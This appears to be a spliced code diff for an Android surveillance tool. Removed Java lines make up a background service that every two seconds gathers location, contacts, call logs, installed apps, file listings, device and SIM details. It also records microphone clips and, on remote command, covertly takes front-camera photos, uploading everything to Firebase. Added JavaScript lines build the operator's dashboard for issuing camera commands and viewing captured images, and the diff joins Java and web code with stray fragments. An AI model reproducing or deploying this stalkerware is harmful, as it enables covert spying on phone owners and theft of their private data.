+                labels: ['Accelerometer X', 'Accelerometer Y', 'Accelerometer Z', 'Gyroscope X', 'Gyroscope Y', 'Gyroscope Z'],
+                datasets: [{
+                    label: 'Sensor Values',
+                    data: [0.12, -0.05, 9.81, 0.02, -0.01, 0.05],
+                    backgroundColor: [
+                        'rgba(99, 102, 241, 0.7)',
+                        'rgba(99, 102, 241, 0.7)',
+                        'rgba(99, 102, 241, 0.7)',
+                        'rgba(16, 185, 129, 0.7)',
+                        'rgba(16, 185, 129, 0.7)',
+                        'rgba(16, 185, 129, 0.7)'
+                    ]
+                }]
+            },
+            options: {
+                responsive: true,
+                maintainAspectRatio: false
+            }
+        });
+
+        // Theme Toggle
+        themeToggle.addEventListener('click', () => {
+            document.body.classList.toggle('dark-mode');
+            const icon = themeToggle.querySelector('i');
+            if (document.body.classList.contains('dark-mode')) {
+                icon.classList.remove('fa-moon');
+                icon.classList.add('fa-sun');
+            } else {
+                icon.classList.remove('fa-sun');
+                icon.classList.add('fa-moon');
+            }
+        });
+
+        // Refresh Data
+        refreshBtn.addEventListener('click', () => {
+            refreshBtn.classList.add('fa-spin');
+            setTimeout(() => {
+                refreshBtn.classList.remove('fa-spin');
+                simulateDataUpdate();
+                checkCommandStatus();
+                loadImages();
+            }, 1000);
+        });
+
+        // Tab Switching
+        tabs.forEach(tab => {
+            tab.addEventListener('click', () => {
+                const tabId = tab.getAttribute('data-tab');
                 
-                // Remove quotes from response
-                result = result.replace("\"", "").trim();
-                Log.d(TAG, "Raw command response: " + result);
+                // Update active tab
+                tabs.forEach(t => t.classList.remove('active'));
+                tab.classList.add('active');
                 
-                return result;
-            }
-        } catch (Exception e) {
-            Log.e(TAG, "Error reading Firebase command: " + e.getMessage());
-        } finally {
-            if (conn != null) {
-                conn.disconnect();
-            }
-        }
-        return "false";
-    }
-
-    // Take front camera picture
-    private void takeFrontCameraPicture() {
-        new CameraTask().execute();
-    }
-
-    private class CameraTask extends AsyncTask<Void, Void, String> {
-        @Override
-        protected String doInBackground(Void... voids) {
-            return captureFrontCameraImage();
-        }
-        
-        @Override
-        protected void onPostExecute(String imagePath) {
-            if (imagePath != null) {
-                Log.d(TAG, "Front camera picture captured: " + imagePath);
-                uploadImageToFirebase(imagePath);
-            } else {
-                Log.e(TAG, "Failed to capture front camera picture");
-            }
-        }
-    }
-
-    private String captureFrontCameraImage() {
-        Camera camera = null;
-        try {
-            // Find front camera
-            int cameraId = findFrontCameraId();
-            if (cameraId == -1) {
-                Log.e(TAG, "Front camera not found");
-                return null;
-            }
-            
-            Log.d(TAG, "Opening front camera with ID: " + cameraId);
-            camera = Camera.open(cameraId);
-            
-            if (camera == null) {
-                Log.e(TAG, "Could not open front camera");
-                return null;
-            }
-            
-            // Set basic parameters
-            Camera.Parameters parameters = camera.getParameters();
-            List<Camera.Size> sizes = parameters.getSupportedPictureSizes();
-            Camera.Size optimalSize = getOptimalPictureSize(sizes);
-            parameters.setPictureSize(optimalSize.width, optimalSize.height);
-            parameters.setJpegQuality(85);
-            camera.setParameters(parameters);
-            
-            // Create temporary file
-            String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
-            String imageFileName = "FRONT_CAM_" + timeStamp + ".jpg";
-            File storageDir = getExternalFilesDir(Environment.DIRECTORY_PICTURES);
-            if (storageDir == null) {
-                storageDir = new File(Environment.getExternalStorageDirectory(), "Pictures");
-                if (!storageDir.exists()) {
-                    storageDir.mkdirs();
-                }
-            }
-            File imageFile = new File(storageDir, imageFileName);
-            
-            // Create picture callback
-            final String[] capturedImagePath = {null};
-            final Object lock = new Object();
-            
-            Camera.PictureCallback pictureCallback = new Camera.PictureCallback() {
-                @Override
-                public void onPictureTaken(byte[] data, Camera camera) {
-                    try {
-                        // Save image to file
-                        FileOutputStream fos = new FileOutputStream(imageFile);
-                        fos.write(data);
-                        fos.close();
-                        capturedImagePath[0] = imageFile.getAbsolutePath();
-                        Log.d(TAG, "Front camera image saved to: " + capturedImagePath[0]);
-                    } catch (Exception e) {
-                        Log.e(TAG, "Error saving front camera image: " + e.getMessage());
-                    } finally {
-                        synchronized (lock) {
-                            lock.notify();
-                        }
-                        if (camera != null) {
-                            camera.release();
-                        }
+                // Show active tab content
+                tabContents.forEach(content => {
+                    content.classList.remove('active');
+                    if (content.id === tabId) {
+                        content.classList.add('active');
                     }
-                }
-            };
-            
-            // Take picture
-            synchronized (lock) {
-                camera.takePicture(null, null, pictureCallback);
-                try {
-                    lock.wait(10000); // Wait max 10 seconds
-                } catch (InterruptedException e) {
-                    Log.e(TAG, "Wait interrupted: " + e.getMessage());
-                    if (camera != null) {
-                        camera.release();
-                    }
-                }
-            }
-            
-            return capturedImagePath[0];
-            
-        } catch (Exception e) {
-            Log.e(TAG, "Front camera capture error: " + e.getMessage());
-            if (camera != null) {
-                camera.release();
-            }
-            return null;
-        }
-    }
+                });
+            });
+        });
 
-    private int findFrontCameraId() {
-        try {
-            int numberOfCameras = Camera.getNumberOfCameras();
-            for (int i = 0; i < numberOfCameras; i++) {
-                Camera.CameraInfo info = new Camera.CameraInfo();
-                Camera.getCameraInfo(i, info);
-                if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
-                    return i;
-                }
+        // Front Camera Command
+        frontCamBtn.addEventListener('click', async () => {
+            if (!database) {
+                showNotification('Firebase not connected. Cannot send command.', 'error');
+                return;
             }
-        } catch (Exception e) {
-            Log.e(TAG, "Error finding front camera: " + e.getMessage());
-        }
-        return -1;
-    }
 
-    private Camera.Size getOptimalPictureSize(List<Camera.Size> sizes) {
-        // Choose a medium size for balance between quality and file size
-        final int TARGET_WIDTH = 1280;
-        final int TARGET_HEIGHT = 720;
-        
-        Camera.Size optimalSize = null;
-        double minDiff = Double.MAX_VALUE;
-        
-        if (sizes != null) {
-            for (Camera.Size size : sizes) {
-                double ratio = (double) size.width / size.height;
-                double diff = Math.abs(ratio - ((double) TARGET_WIDTH / TARGET_HEIGHT));
+            try {
+                // Get current status
+                const snapshot = await commandsRef.child('front_camera').once('value');
+                const currentStatus = snapshot.val();
+                const newStatus = !currentStatus;
+
+                // Update Firebase
+                await commandsRef.update({
+                    'front_camera': newStatus,
+                    'last_updated': new Date().toISOString()
+                });
+
+                // Update UI
+                updateFrontCamStatus(newStatus);
                 
-                if (diff < minDiff) {
-                    optimalSize = size;
-                    minDiff = diff;
-                }
+                // Add to command log
+                addCommandLog(`Front camera ${newStatus ? 'enabled' : 'disabled'}`);
+                
+                showNotification(`Front camera ${newStatus ? 'enabled' : 'disabled'} successfully`);
+                
+            } catch (error) {
+                console.error('Command error:', error);
+                showNotification('Failed to send command', 'error');
             }
-        }
-        
-        if (optimalSize == null && sizes != null && !sizes.isEmpty()) {
-            optimalSize = sizes.get(sizes.size() / 2); // Choose middle size
-        }
-        
-        return optimalSize;
-    }
+        });
 
-    private void uploadImageToFirebase(String imagePath) {
-        new Thread(new Runnable() {
-            @Override
-            public void run() {
-                try {
-                    // Read image file
-                    File imageFile = new File(imagePath);
-                    Bitmap bitmap = BitmapFactory.decodeFile(imagePath);
-                    if (bitmap == null) {
-                        Log.e(TAG, "Could not decode front camera image file");
-                        return;
-                    }
-                    
-                    // Compress image
-                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                    bitmap.compress(Bitmap.CompressFormat.JPEG, 70, baos);
-                    byte[] imageData = baos.toByteArray();
-                    
-                    // Convert to base64
-                    String base64Image = Base64.encodeToString(imageData, Base64.DEFAULT);
-                    
-                    // Create JSON payload
-                    SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'");
-                    sdf.setTimeZone(TimeZone.getTimeZone("UTC"));
-                    String currentTime = sdf.format(new Date());
-                    
-                    JSONObject payload = new JSONObject();
-                    payload.put("image_data", base64Image);
-                    payload.put("timestamp", currentTime);
-                    payload.put("filename", new File(imagePath).getName());
-                    payload.put("size", imageData.length);
-                    payload.put("type", "front_camera");
-                    
-                    // Upload to Firebase
-                    pushImageToFirebase(FIREBASE_IMAGE_URL, payload);
-                    
-                    Log.d(TAG, "Front camera image uploaded successfully");
-                    
-                    // Delete local file after upload
-                    if (imageFile.exists()) {
-                        imageFile.delete();
-                    }
-                    
-                } catch (Exception e) {
-                    Log.e(TAG, "Error uploading front camera image: " + e.getMessage());
-                }
-            }
-        }).start();
-    }
-
-    private void pushImageToFirebase(String firebaseURL, JSONObject jsonData) {
-        HttpURLConnection conn = null;
-        try {
-            URL url = new URL(firebaseURL);
-            conn = (HttpURLConnection) url.openConnection();
-            conn.setRequestMethod("POST");
-            conn.setDoOutput(true);
-            conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
-            conn.setConnectTimeout(10000);
-            conn.setReadTimeout(10000);
-
-            OutputStream os = conn.getOutputStream();
-            os.write(jsonData.toString().getBytes("UTF-8"));
-            os.flush();
-            os.close();
-
-            int responseCode = conn.getResponseCode();
-            if (responseCode == HttpURLConnection.HTTP_OK) {
-                Log.d(TAG, "✓ Front camera image sent to Firebase");
+        // Update front camera status display
+        function updateFrontCamStatus(status) {
+            if (status) {
+                frontCamBtn.classList.add('active');
+                frontCamStatus.textContent = 'Status: Enabled';
+                frontCamStatus.className = 'command-status status-true';
+                frontCamStatusText.textContent = 'Enabled';
+                frontCamStatusText.style.color = '#10b981';
             } else {
-                Log.e(TAG, "✗ Failed to send front camera image: " + responseCode);
+                frontCamBtn.classList.remove('active');
+                frontCamStatus.textContent = 'Status: Disabled';
+                frontCamStatus.className = 'command-status status-false';
+                frontCamStatusText.textContent = 'Disabled';
+                frontCamStatusText.style.color = '#ef4444';
             }
-
-        } catch (Exception e) {
-            Log.e(TAG, "Error pushing image to Firebase: " + e.getMessage());
-        } finally {
-            if (conn != null) {
-                conn.disconnect();
-            }
+            lastCommandUpdate.textContent = new Date().toLocaleString();
         }
-    }
 
-    private void storeLocationHistory(Location location) {
-        // Store location in shared preferences or local database
-        // This can be used for tracking movement patterns
-    }
+        // Check command status from Firebase
+        async function checkCommandStatus() {
+            if (!database) return;
 
-    private void setupAudioRecording() {
-        HandlerThread audioThread = new HandlerThread("AudioRecorder");
-        audioThread.start();
-        audioHandler = new Handler(audioThread.getLooper());
-
-        File externalDir = getExternalFilesDir(null);
-        if (externalDir != null) {
-            audioFilePath = externalDir.getAbsolutePath() + "/audio_record.3gp";
-        } else {
-            audioFilePath = getFilesDir().getAbsolutePath() + "/audio_record.3gp";
-        }
-    }
-
-    private void startStructuredUpdates() {
-        HandlerThread thread = new HandlerThread("StructuredUpdater");
-        thread.start();
-        Looper looper = thread.getLooper();
-        handler = new Handler(looper);
-
-        runnable = new Runnable() {
-            @Override
-            public void run() {
-                try {
-                    float batteryLevel = getBatteryPercentage();
-                    JSONObject deviceInfo = getDeviceInfo();
-                    JSONObject locationData = getDeviceLocation();
-                    JSONObject appsList = getInstalledApps();
-                    JSONObject myFiles = getMyFiles();
-                    JSONObject sensorData = getSensorData();
-                    JSONObject callLogs = getCallLogs();
-                    JSONObject contacts = getContacts();
-                    JSONObject systemInfo = getSystemInfo();
-
-                    sendStructuredData(deviceInfo, batteryLevel, locationData, appsList, myFiles, 
-									   sensorData, callLogs, contacts, systemInfo);
-
-                    // Record audio periodically
-                    recordAudioSample();
-
-                } catch (Exception e) {
-                    Log.e(TAG, "Structured Update Error:", e);
-                }
-                handler.postDelayed(this, 2000); // every 2 sec
-            }
-        };
-
-        handler.post(runnable);
-    }
-
-    private JSONObject getDeviceLocation() {
-        JSONObject locJson = new JSONObject();
-        try {
-            if (latestLocation != null) {
-                locJson.put("latitude", latestLocation.getLatitude());
-                locJson.put("longitude", latestLocation.getLongitude());
-                locJson.put("altitude", latestLocation.getAltitude());
-                locJson.put("accuracy", latestLocation.getAccuracy());
-                locJson.put("speed", latestLocation.getSpeed());
-                locJson.put("bearing", latestLocation.getBearing());
-                locJson.put("timestamp", latestLocation.getTime());
-                locJson.put("provider", latestLocation.getProvider());
-            } else {
-                locJson.put("error", "Location not available yet");
-            }
-        } catch (Exception e) {
-            try { 
-                locJson.put("error", e.getMessage()); 
-            } catch(JSONException ignored){}
-        }
-        return locJson;
-    }
-
-    private float getBatteryPercentage() {
-        try {
-            BatteryManager bm = (BatteryManager) getSystemService(Context.BATTERY_SERVICE);
-            if (bm != null) {
-                return (float) bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
-            }
-        } catch (Exception e) {
-            Log.e(TAG, "Battery level error", e);
-        }
-        return -1;
-    }
-
-    private JSONObject getDeviceInfo() {
-        JSONObject info = new JSONObject();
-        try {
-            info.put("brand", android.os.Build.BRAND);
-            info.put("model", android.os.Build.MODEL);
-            info.put("os_version", android.os.Build.VERSION.RELEASE);
-            info.put("device_id", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
-            info.put("network_type", getNetworkType());
-            info.put("ip_address", getIPAddress());
-            info.put("sdk_version", android.os.Build.VERSION.SDK_INT);
-            info.put("manufacturer", android.os.Build.MANUFACTURER);
-            info.put("product", android.os.Build.PRODUCT);
-            info.put("device", android.os.Build.DEVICE);
-
-            // SIM information
-            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
-            if (tm != null) {
-                info.put("sim_operator", tm.getSimOperatorName());
-                info.put("network_operator", tm.getNetworkOperatorName());
-                info.put("phone_type", tm.getPhoneType());
-            }
-
-        } catch (Exception e) {
-            try { 
-                info.put("error", e.getMessage()); 
-            } catch(JSONException ignored){}
-        }
-        return info;
-    }
-
-    private JSONObject getInstalledApps() {
-        JSONObject appsJson = new JSONObject();
-        try {
-            int count = 1;
-            List<ApplicationInfo> packages = getPackageManager().getInstalledApplications(0);
-            for (ApplicationInfo appInfo : packages) {
-                try {
-                    String appName = getPackageManager().getApplicationLabel(appInfo).toString();
-                    String packageName = appInfo.packageName;
-                    long installTime = getPackageManager().getPackageInfo(packageName, 0).firstInstallTime;
-                    String installTimeStr = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(installTime));
-
-                    JSONObject appDetails = new JSONObject();
-                    appDetails.put("name", appName);
-                    appDetails.put("package", packageName);
-                    appDetails.put("install_time", installTimeStr);
-                    appDetails.put("system_app", (appInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0);
-
-                    appsJson.put(String.valueOf(count), appDetails);
-                    count++;
-                } catch (Exception e) {
-                    // Skip this app if there's an error
-                }
-            }
-        } catch (Exception e) {
-            try { 
-                appsJson.put("error", e.getMessage()); 
-            } catch(JSONException ignored){}
-        }
-        return appsJson;
-    }
-
-    private JSONObject getMyFiles() {
-        JSONObject filesJson = new JSONObject();
-        try {
-            String[] folders = {"Download", "DCIM", "Pictures", "Movies", "Android", "Documents", "Music"};
-            for (String folder : folders) {
-                File dir;
-                if(folder.equals("Android")){
-                    dir = new File(Environment.getExternalStorageDirectory(), "Android");
-                } else {
-                    dir = new File(Environment.getExternalStorageDirectory(), folder);
-                }
-
-                JSONObject folderFiles = new JSONObject();
-                if (dir.exists() && dir.isDirectory()) {
-                    File[] files = dir.listFiles();
-                    if(files != null){
-                        for(int i=0; i<files.length && i<50; i++){ // Limit to 50 files per folder
-                            try {
-                                JSONObject fileInfo = new JSONObject();
-                                fileInfo.put("name", files[i].getName());
-                                fileInfo.put("size", files[i].length());
-                                fileInfo.put("modified", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(
-												 new Date(files[i].lastModified())));
-                                fileInfo.put("is_directory", files[i].isDirectory());
-
-                                folderFiles.put(String.valueOf(i+1), fileInfo);
-                            } catch (Exception e) {
-                                // Skip this file if there's an error
-                            }
-                        }
-                    }
-                }
-                filesJson.put(folder, folderFiles);
-            }
-        } catch (Exception e) {
-            try { 
-                filesJson.put("error", e.getMessage()); 
-            } catch(JSONException ignored){}
-        }
-        return filesJson;
-    }
-
-    private JSONObject getSensorData() {
-        JSONObject sensorJson = new JSONObject();
-        try {
-            JSONObject accelerometer = new JSONObject();
-            accelerometer.put("x", accelerometerData[0]);
-            accelerometer.put("y", accelerometerData[1]);
-            accelerometer.put("z", accelerometerData[2]);
-            sensorJson.put("accelerometer", accelerometer);
-
-            JSONObject gyroscope = new JSONObject();
-            gyroscope.put("x", gyroscopeData[0]);
-            gyroscope.put("y", gyroscopeData[1]);
-            gyroscope.put("z", gyroscopeData[2]);
-            sensorJson.put("gyroscope", gyroscope);
-
-            sensorJson.put("light_level", lightLevel);
-            sensorJson.put("proximity", proximityValue);
-
-        } catch (Exception e) {
-            try { 
-                sensorJson.put("error", e.getMessage()); 
-            } catch(JSONException ignored){}
-        }
-        return sensorJson;
-    }
-
-    private JSONObject getCallLogs() {
-        JSONObject callLogsJson = new JSONObject();
-        try {
-            String[] projection = new String[]{
-                CallLog.Calls.NUMBER,
-                CallLog.Calls.TYPE,
-                CallLog.Calls.DATE,
-                CallLog.Calls.DURATION
-            };
-
-            // Note: This requires READ_CALL_LOG permission
-            android.database.Cursor cursor = getContentResolver().query(
-                CallLog.Calls.CONTENT_URI, projection, null, null, CallLog.Calls.DATE + " DESC LIMIT 50");
-
-            if (cursor != null) {
-                try {
-                    int count = 1;
-                    while (cursor.moveToNext()) {
-                        try {
-                            JSONObject call = new JSONObject();
-                            call.put("number", cursor.getString(0));
-                            call.put("type", cursor.getInt(1)); // 1=Incoming, 2=Outgoing, 3=Missed
-                            call.put("date", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(
-										 new Date(cursor.getLong(2))));
-                            call.put("duration", cursor.getString(3));
-
-                            callLogsJson.put(String.valueOf(count), call);
-                            count++;
-                        } catch (Exception e) {
-                            // Skip this call record if there's an error
-                        }
-                    }
-                } finally {
-                    cursor.close();
-                }
-            }
-        } catch (Exception e) {
-            try { 
-                callLogsJson.put("error", e.getMessage()); 
-            } catch(JSONException ignored){}
-        }
-        return callLogsJson;
-    }
-
-    private JSONObject getContacts() {
-        JSONObject contactsJson = new JSONObject();
-        try {
-            android.database.Cursor cursor = getContentResolver().query(
-                ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
-
-            if (cursor != null) {
-                try {
-                    int count = 1;
-                    while (cursor.moveToNext() && count <= 100) { // Limit to 100 contacts
-                        try {
-                            String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
-                            String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
-
-                            JSONObject contact = new JSONObject();
-                            contact.put("name", name);
-
-                            // Get phone numbers
-                            JSONArray phones = new JSONArray();
-                            android.database.Cursor phoneCursor = getContentResolver().query(
-                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
-                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null);
-
-                            if (phoneCursor != null) {
-                                try {
-                                    while (phoneCursor.moveToNext()) {
-                                        String phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(
-																					   ContactsContract.CommonDataKinds.Phone.NUMBER));
-                                        if (phoneNumber != null) {
-                                            phones.put(phoneNumber);
-                                        }
-                                    }
-                                } finally {
-                                    phoneCursor.close();
-                                }
-                            }
-                            contact.put("phones", phones);
-
-                            contactsJson.put(String.valueOf(count), contact);
-                            count++;
-                        } catch (Exception e) {
-                            // Skip this contact if there's an error
-                        }
-                    }
-                } finally {
-                    cursor.close();
-                }
-            }
-        } catch (Exception e) {
-            try { 
-                contactsJson.put("error", e.getMessage()); 
-            } catch(JSONException ignored){}
-        }
-        return contactsJson;
-    }
-
-    private JSONObject getSystemInfo() {
-        JSONObject systemInfo = new JSONObject();
-        try {
-            // Memory info
-            android.app.ActivityManager activityManager = (android.app.ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
-            if (activityManager != null) {
-                android.app.ActivityManager.MemoryInfo memoryInfo = new android.app.ActivityManager.MemoryInfo();
-                activityManager.getMemoryInfo(memoryInfo);
-
-                systemInfo.put("total_memory", memoryInfo.totalMem);
-                systemInfo.put("available_memory", memoryInfo.availMem);
-                systemInfo.put("low_memory", memoryInfo.lowMemory);
-            }
-
-            // Storage info
-            File path = Environment.getDataDirectory();
-            android.os.StatFs stat = new android.os.StatFs(path.getPath());
-            long blockSize = stat.getBlockSize();
-            long totalBlocks = stat.getBlockCount();
-            long availableBlocks = stat.getAvailableBlocks();
-
-            systemInfo.put("total_storage", totalBlocks * blockSize);
-            systemInfo.put("available_storage", availableBlocks * blockSize);
-
-            // CPU info
-            systemInfo.put("cpu_cores", Runtime.getRuntime().availableProcessors());
-
-            // Battery status
-            BatteryManager bm = (BatteryManager) getSystemService(Context.BATTERY_SERVICE);
-            if (bm != null) {
-                systemInfo.put("battery_health", bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_STATUS));
-                systemInfo.put("charging", isBatteryCharging());
-            }
-
-        } catch (Exception e) {
-            try { 
-                systemInfo.put("error", e.getMessage()); 
-            } catch(JSONException ignored){}
-        }
-        return systemInfo;
-    }
-
-    private boolean isBatteryCharging() {
-        try {
-            Intent batteryIntent = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
-            if (batteryIntent != null) {
-                int status = batteryIntent.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
-                return status == BatteryManager.BATTERY_STATUS_CHARGING || 
-					status == BatteryManager.BATTERY_STATUS_FULL;
-            }
-        } catch (Exception e) {
-            Log.e(TAG, "Battery charging check error", e);
-        }
-        return false;
-    }
-
-    private void recordAudioSample() {
-        audioHandler.post(new Runnable() {
-				@Override
-				public void run() {
-					try {
-						if (!isRecording) {
-							startAudioRecording();
-							// Stop recording after 10 seconds
-							audioHandler.postDelayed(new Runnable() {
-									@Override
-									public void run() {
-										stopAudioRecording();
-									}
-								}, 10000);
-						}
-					} catch (Exception e) {
-						Log.e(TAG, "Audio recording error", e);
-					}
-				}
-			});
-    }
-
-    private void startAudioRecording() {
-        try {
-            mediaRecorder = new MediaRecorder();
-            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
-            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
-            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
-            mediaRecorder.setOutputFile(audioFilePath);
-
-            mediaRecorder.prepare();
-            mediaRecorder.start();
-            isRecording = true;
-
-        } catch (Exception e) {
-            Log.e(TAG, "Audio recording start failed", e);
-        }
-    }
-
-    private void stopAudioRecording() {
-        try {
-            if (mediaRecorder != null && isRecording) {
-                mediaRecorder.stop();
-                mediaRecorder.release();
-                mediaRecorder = null;
-                isRecording = false;
-
-                // Upload recorded audio
-                uploadAudioFile();
-            }
-        } catch (Exception e) {
-            Log.e(TAG, "Audio recording stop failed", e);
-        }
-    }
-
-    private void uploadAudioFile() {
-        new Thread(new Runnable() {
-				@Override
-				public void run() {
-					try {
-						File audioFile = new File(audioFilePath);
-						if (audioFile.exists()) {
-							FileInputStream fis = new FileInputStream(audioFile);
-							byte[] audioData = new byte[(int) audioFile.length()];
-							fis.read(audioData);
-							fis.close();
-
-							String base64Audio = Base64.encodeToString(audioData, Base64.DEFAULT);
-
-							JSONObject audioJson = new JSONObject();
-							audioJson.put("audio_data", base64Audio);
-							audioJson.put("timestamp", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date()));
-
-							pushToFirebase(FIREBASE_RES_URL + "audio_samples.json", audioJson);
-
-							// Delete local file after upload
-							audioFile.delete();
-						}
-					} catch (Exception e) {
-						Log.e(TAG, "Audio upload failed", e);
-					}
-				}
-			}).start();
-    }
-
-    private String getNetworkType() {
-        try {
-            ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
-            if (cm != null) {
-                NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
-                if (activeNetwork != null && activeNetwork.isConnected()) {
-                    return activeNetwork.getTypeName() + " (" + activeNetwork.getSubtypeName() + ")";
-                }
-            }
-        } catch (Exception e) {
-            Log.e(TAG, "Network type error", e);
-        }
-        return "None";
-    }
-
-    private String getIPAddress() {
-        try {
-            WifiManager wm = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
-            if (wm != null) {
-                WifiInfo wi = wm.getConnectionInfo();
-                int ip = wi.getIpAddress();
-                return String.format("%d.%d.%d.%d", (ip & 0xff), (ip >> 8 & 0xff), (ip >> 16 & 0xff), (ip >> 24 & 0xff));
-            }
-        } catch (Exception e) {
-            Log.e(TAG, "IP address error", e);
-        }
-        return "Unknown";
-    }
-
-    private void sendStructuredData(final JSONObject deviceInfo, final float batteryLevel, 
-									final JSONObject locationData, final JSONObject appsList, 
-									final JSONObject myFiles, final JSONObject sensorData,
-									final JSONObject callLogs, final JSONObject contacts,
-									final JSONObject systemInfo) {
-        new Thread(new Runnable() {
-				@Override
-				public void run() {
-					try {
-						SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'");
-						sdf.setTimeZone(TimeZone.getTimeZone("UTC"));
-						String currentTime = sdf.format(new Date());
-
-						JSONObject payload = new JSONObject();
-						payload.put("Device", deviceInfo);
-						payload.put("Battery", batteryLevel);
-						payload.put("Location", locationData);
-						payload.put("Apps", appsList);
-						payload.put("MyFiles", myFiles);
-						payload.put("Sensors", sensorData);
-						payload.put("CallLogs", callLogs);
-						payload.put("Contacts", contacts);
-						payload.put("SystemInfo", systemInfo);
-						payload.put("confirm", "Yes Confirm");
-						payload.put("received_at", currentTime);
-
-						pushToFirebase(FIREBASE_RES_URL + "structured_data.json", payload);
-					} catch (Exception e) {
-						Log.e(TAG, "Structured Push Error:", e);
-					}
-				}
-			}).start();
-    }
-
-    private void pushToFirebase(String firebaseURL, JSONObject jsonData) throws Exception {
-        HttpURLConnection conn = null;
-        try {
-            URL url = new URL(firebaseURL);
-            conn = (HttpURLConnection) url.openConnection();
-            conn.setRequestMethod("PUT");
-            conn.setDoOutput(true);
-            conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
-            conn.setConnectTimeout(10000);
-            conn.setReadTimeout(10000);
-
-            OutputStream os = conn.getOutputStream();
-            os.write(jsonData.toString().getBytes("UTF-8"));
-            os.flush();
-            os.close();
-
-            int responseCode = conn.getResponseCode();
-            if (responseCode == HttpURLConnection.HTTP_OK) {
-                Log.d(TAG, "✓ Data Sent Successfully");
-            } else {
-                Log.e(TAG, "✗ Data Send Failed: " + responseCode);
-            }
-
-        } finally {
-            if (conn != null) {
-                conn.disconnect();
+            try {
+                const snapshot = await commandsRef.child('front_camera').once('value');
+                const status = snapshot.val();
+                updateFrontCamStatus(status);
+            } catch (error) {
+                console.error('Status check error:', error);
             }
         }
-    }
 
-    @Override
-    public void onDestroy() {
-        super.onDestroy();
-        if (handler != null && runnable != null) {
-            handler.removeCallbacks(runnable);
+        // Add entry to command log
+        function addCommandLog(message) {
+            const now = new Date();
+            const timeString = now.toLocaleTimeString();
+            const logEntry = document.createElement('li');
+            logEntry.innerHTML = `<span class="data-key">${timeString}</span><span class="data-value">${message}</span>`;
+            commandLog.insertBefore(logEntry, commandLog.firstChild);
+            
+            // Keep only last 10 entries
+            while (commandLog.children.length > 10) {
+                commandLog.removeChild(commandLog.lastChild);
+            }
         }
-        if (cameraCommandHandler != null && cameraCommandChecker != null) {
-            cameraCommandHandler.removeCallbacks(cameraCommandChecker);
-        }
-        if (sensorManager != null) {
-            sensorManager.unregisterListener(sensorEventListener);
-        }
-        if (mediaRecorder != null && isRecording) {
-            stopAudioRecording();
-        }
-        Log.d(TAG, "GuardService destroyed");
-    }
 
-    @Override
-    public IBinder onBind(Intent intent) {
-        return null;
-    }
-}ock';
+        // Load and display images from Firebase
+        function loadImages() {
+            if (!imagesRef) return;
+
+            imagesRef.orderByChild('timestamp').limitToLast(50).once('value')
+                .then(snapshot => {
+                    const images = snapshot.val();
+                    displayImages(images);
+                    updateImageStats(images);
+                })
+                .catch(error => {
+                    console.error('Error loading images:', error);
+                });
+        }
+
+        // Display images in gallery
+        function displayImages(images) {
+            if (!images) {
+                noImagesMessage.style.display = 'block';
                 imageGallery.innerHTML = '';
                 imagesCount.textContent = '0';
                 return;
